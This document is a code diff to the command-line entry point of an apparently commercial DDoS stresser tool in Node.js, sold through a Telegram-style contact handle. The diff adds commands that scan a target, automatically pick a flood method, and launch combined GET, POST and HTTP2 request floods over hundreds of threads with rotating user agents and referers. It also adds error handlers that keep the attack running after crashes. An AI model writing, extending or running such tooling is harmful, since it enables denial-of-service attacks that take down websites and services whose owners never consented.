@@ -1,5 +1,11 @@
 #!/usr/bin/env node
 
+// Increase Node.js memory limit to 8GB
+import { execSync } from 'child_process';
+if (!process.env.NODE_OPTIONS || !process.env.NODE_OPTIONS.includes('--max-old-space-size')) {
+    process.env.NODE_OPTIONS = '--max-old-space-size=8192';
+}
+
 import { program } from 'commander';
 import { readFileSync, existsSync } from 'fs';
 import { join, dirname } from 'path';
@@ -8,6 +14,9 @@ import chalk from 'chalk';
 import crypto from 'crypto';
 import readline from 'readline';
 import { AttackManager } from './src/core/attack-manager.js';
+import { ComboAttackManager, COMBO_PROFILES } from './src/core/combo-attack.js';
+import { TargetScanner } from './src/core/target-scanner.js';
+import { AttackProfilesManager, PREDEFINED_PROFILES } from './src/core/attack-profiles.js';
 import { ProxyManager } from './src/utils/proxy-manager.js';
 import { logger } from './src/utils/logger.js';
 import { LAYER4_METHODS } from './src/methods/layer4/index.js';
@@ -58,9 +67,9 @@ async function verifyPassword() {
             } else {
                 console.log(chalk.red('\n❌ Authentication failed!\n'));
                 console.log(chalk.bold.red('╔═══════════════════════════════════════════╗'));
-                console.log(chalk.bold.red('║') + chalk.bold.white('   ⚠️  AKSES DITOLAK! PASSWORD SALAH! ⚠️   ') + chalk.bold.red('║'));
+                console.log(chalk.bold.red('║') + chalk.bold.white('   ⚠️  AKSES DITOLAK! PLU BUKAN BUYER ARYZZ⚠️   ') + chalk.bold.red('║'));
                 console.log(chalk.bold.red('╚═══════════════════════════════════════════╝'));
-                console.log(chalk.gray('  Contact @AryzXploit to purchase'));
+                console.log(chalk.gray('  Contact @AryzzXploit to purchase'));
                 console.log(chalk.gray('  Unauthorized access is prohibited\n'));
                 process.exit(1);
             }
@@ -113,6 +122,19 @@ function verifyIntegrity() {
     console.log(chalk.gray(`   Protected: Encrypted & Anti-Rename`));
     console.log(chalk.gray(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`));
 }
+
+// Add global error handlers to prevent crashes
+process.on('unhandledRejection', (reason, promise) => {
+    logger.error('Unhandled Promise Rejection:', reason);
+    logger.debug('Promise:', promise);
+    // Don't exit - continue running
+});
+
+process.on('uncaughtException', (error) => {
+    logger.error('Uncaught Exception:', error);
+    logger.error('Stack:', error.stack);
+    // Don't exit - continue running
+});
 
 // Verify integrity
 verifyIntegrity();
@@ -275,6 +297,179 @@ program
         proxyManager.saveToFile(proxies, outputPath);
         
         logger.success(`✅ Saved ${proxies.length} working proxies to ${options.output}`);
+    });
+
+// Scan command
+program
+    .command('scan')
+    .description('🔍 Scan target and get attack recommendations')
+    .requiredOption('-t, --target <url>', 'Target URL or IP')
+    .action(async (options) => {
+        logger.info('🔍 Starting target scan...\n');
+        
+        const scanner = new TargetScanner(options.target);
+        
+        try {
+            await scanner.scan();
+            scanner.printReport();
+            
+            const bestMethod = scanner.getBestMethod();
+            logger.info(`\n💡 Best Method: ${bestMethod}`);
+            logger.info(`💡 Use: node index.js attack -t ${options.target} -m ${bestMethod}`);
+        } catch (err) {
+            logger.error(`Scan failed: ${err.message}`);
+        }
+    });
+
+// Combo attack command
+program
+    .command('combo')
+    .description('🔥 Launch combo attack with multiple methods')
+    .requiredOption('-t, --target <url>', 'Target URL or IP:PORT')
+    .option('-m, --methods <methods>', 'Comma-separated methods (e.g., GET,POST,HTTP2)', 'GET,POST,HTTP2')
+    .option('-th, --threads <number>', 'Total threads', '600')
+    .option('-d, --duration <seconds>', 'Attack duration', '180')
+    .option('-r, --rpc <number>', 'Requests per connection', '10')
+    .option('-p, --profile <name>', 'Use predefined combo profile')
+    .action(async (options) => {
+        let methods, threads, duration, rpc;
+
+        // Use profile if specified
+        if (options.profile) {
+            const profile = COMBO_PROFILES[options.profile.toUpperCase().replace(/-/g, '_')];
+            if (!profile) {
+                logger.error(`Profile '${options.profile}' not found`);
+                logger.info(`Available profiles: ${Object.keys(COMBO_PROFILES).join(', ')}`);
+                return;
+            }
+            
+            logger.info(`🎯 Using profile: ${profile.name}`);
+            logger.info(`📝 ${profile.description}`);
+            methods = profile.methods;
+            threads = profile.threads;
+            rpc = profile.rpc;
+            duration = options.duration;
+        } else {
+            methods = options.methods.split(',').map(m => m.trim().toUpperCase());
+            threads = parseInt(options.threads);
+            duration = parseInt(options.duration);
+            rpc = parseInt(options.rpc);
+        }
+
+        // Load user agents and referers
+        let userAgents = [];
+        let referers = [];
+        
+        const uaPath = join(__dirname, 'files', 'useragent.txt');
+        const refPath = join(__dirname, 'files', 'referers.txt');
+
+        if (existsSync(uaPath)) {
+            userAgents = readFileSync(uaPath, 'utf-8').split('\n').filter(l => l.trim());
+        }
+        if (existsSync(refPath)) {
+            referers = readFileSync(refPath, 'utf-8').split('\n').filter(l => l.trim());
+        }
+
+        const comboManager = new ComboAttackManager({
+            target: options.target,
+            methods: methods,
+            threads: threads,
+            duration: duration,
+            rpc: rpc,
+            userAgents: userAgents,
+            referers: referers
+        });
+
+        await comboManager.start();
+
+        // Handle graceful shutdown
+        process.on('SIGINT', () => {
+            logger.warning('\n⚠️  Received interrupt signal');
+            comboManager.stop();
+            process.exit(0);
+        });
+    });
+
+// Smart attack command
+program
+    .command('smart')
+    .description('🧠 Auto-scan and attack with best method')
+    .requiredOption('-t, --target <url>', 'Target URL')
+    .option('-th, --threads <number>', 'Number of threads', '400')
+    .option('-d, --duration <seconds>', 'Attack duration', '180')
+    .option('-r, --rpc <number>', 'Requests per connection', '5')
+    .action(async (options) => {
+        logger.info('🧠 Smart Attack Mode - Scanning target...\n');
+        
+        const scanner = new TargetScanner(options.target);
+        
+        try {
+            await scanner.scan();
+            scanner.printReport();
+            
+            const bestMethod = scanner.getBestMethod();
+            logger.info(`\n💡 Auto-selected method: ${bestMethod}\n`);
+            
+            // Load user agents and referers
+            let userAgents = [];
+            let referers = [];
+            
+            const uaPath = join(__dirname, 'files', 'useragent.txt');
+            const refPath = join(__dirname, 'files', 'referers.txt');
+
+            if (existsSync(uaPath)) {
+                userAgents = readFileSync(uaPath, 'utf-8').split('\n').filter(l => l.trim());
+            }
+            if (existsSync(refPath)) {
+                referers = readFileSync(refPath, 'utf-8').split('\n').filter(l => l.trim());
+            }
+
+            const attackManager = new AttackManager({
+                target: options.target,
+                method: bestMethod,
+                threads: parseInt(options.threads),
+                duration: parseInt(options.duration),
+                rpc: parseInt(options.rpc),
+                userAgents: userAgents,
+                referers: referers
+            });
+
+            await attackManager.start();
+
+            process.on('SIGINT', () => {
+                logger.warning('\n⚠️  Received interrupt signal');
+                attackManager.stop();
+                process.exit(0);
+            });
+        } catch (err) {
+            logger.error(`Smart attack failed: ${err.message}`);
+        }
+    });
+
+// Profiles command
+program
+    .command('profiles')
+    .description('📋 List available attack profiles')
+    .action(() => {
+        console.log(chalk.bold('\n🔥 COMBO ATTACK PROFILES:\n'));
+        Object.entries(COMBO_PROFILES).forEach(([key, profile]) => {
+            console.log(chalk.cyan(`  ${profile.name}`));
+            console.log(chalk.gray(`     ${profile.description}`));
+            console.log(chalk.yellow(`     Methods: ${profile.methods.join(', ')}`));
+            console.log(chalk.gray(`     Threads: ${profile.threads}, RPC: ${profile.rpc}\n`));
+        });
+
+        console.log(chalk.bold('💡 PREDEFINED PROFILES:\n'));
+        Object.entries(PREDEFINED_PROFILES).forEach(([key, profile]) => {
+            console.log(chalk.cyan(`  ${profile.name}`));
+            console.log(chalk.gray(`     ${profile.description}`));
+            if (profile.config.type === 'combo') {
+                console.log(chalk.yellow(`     Methods: ${profile.config.methods.join(', ')}`));
+            } else {
+                console.log(chalk.yellow(`     Method: ${profile.config.method || 'Auto'}`));
+            }
+            console.log(chalk.gray(`     Threads: ${profile.config.threads}, Duration: ${profile.config.duration}s\n`));
+        });
     });
 
 // Telegram command
